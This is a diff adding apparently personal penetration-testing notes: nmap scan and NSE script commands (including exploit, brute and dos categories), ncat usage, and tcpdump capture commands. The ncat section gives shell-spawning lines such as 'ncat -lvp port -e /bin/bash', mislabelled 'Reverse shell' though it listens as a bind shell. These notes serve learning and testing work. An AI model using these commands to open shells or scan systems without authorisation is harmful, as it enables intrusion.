@@ -1,0 +1,59 @@
+//Initial nmap scan 
+sudo nmap <target> -p- -sV
+//port scan, packet analyzing, and os detection
+sudo nmap <target> -p <port> --packet-trace -Pn -n --disable-arp-ping OR sudo nmap <target> -p <port> -O
+sudo nmap <target> -p <port> -A
+
+//Nmap scripting 
+sudo nmap <target> -p <port> -sV --script vuln
+sudo nmap <target> -p <port> --script banner,smtp-commands
+
+//Scrtiping categories 
+auth	Determination of authentication credentials.
+broadcast	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
+brute	Executes scripts that try to log in to the respective service by brute-forcing with credentials.
+default	Default scripts executed by using the -sC option.
+discovery	Evaluation of accessible services.
+dos	These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
+exploit	This category of scripts tries to exploit known vulnerabilities for the scanned port.
+external	Scripts that use external services for further processing.
+fuzzer	This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
+intrusive	Intrusive scripts that could negatively affect the target system.
+malware	Checks if some malware infects the target system.
+safe	Defensive scripts that do not perform intrusive and destructive access.
+version	Extension for service detection.
+vuln	Identification of specific vulnerabilities.
+
+//Ncat and tcpdump
+ncat <target> <port> OR nc -nv <target> <port>
+ncat -l <port> 
+
+//Ncat flags 
+-n	No DNS resolution (faster connections)
+-v	Verbose mode (shows connection details)
+-vv	Extra verbose (more debugging output)
+-u	Use UDP instead of TCP
+-l	Listen mode (acts as a server)
+-e /bin/sh	Execute shell on connection (used for reverse shells)
+--keep-open	Keep the connection open after a client disconnects
+--ssl	Enable SSL encryption for secure communication
+--ssl-verify	Verify SSL certificates (useful for secure services) 
+
+//Common Ncat scripts 
+Connect to a server	ncat -nv target_ip port
+Run a TCP server	ncat -lvp port
+Run a UDP server	ncat -lvp port -u
+Send a file	ncat -lvp port < file.txt
+Receive a file	ncat sender_ip port > file.txt
+Encrypted server	ncat --ssl -lvp port
+Reverse shell	ncat -lvp port -e /bin/bash
+Scan open ports	ncat -zv target_ip 1-1000
+
+ncat --ssl -lvp <port>  --> secures communication in server
+ncat --ssl <target> <port> --> uses secure server (as client) 
+sudo tcpdump -i eth0 --> capturing network traffic, captures packets on ethernet interface
+sudo tcpdump -i eth0 port <port> --> specific traffic on a port 
+sudo tcpdump -i eth0 tcp or sudo tcpdump -i eth0 udp -->specify TCP or UDP packets 
+sudo tcpdump -A -i eth0 port <port> --> viewing packet content, -A shows the packet payload
+sudo tcpdump -w capture.pcap -i eth0 port <port> --> saving the captured traffic, -w capture.pcap saves the packet as a file for Wireshark analysis 
+
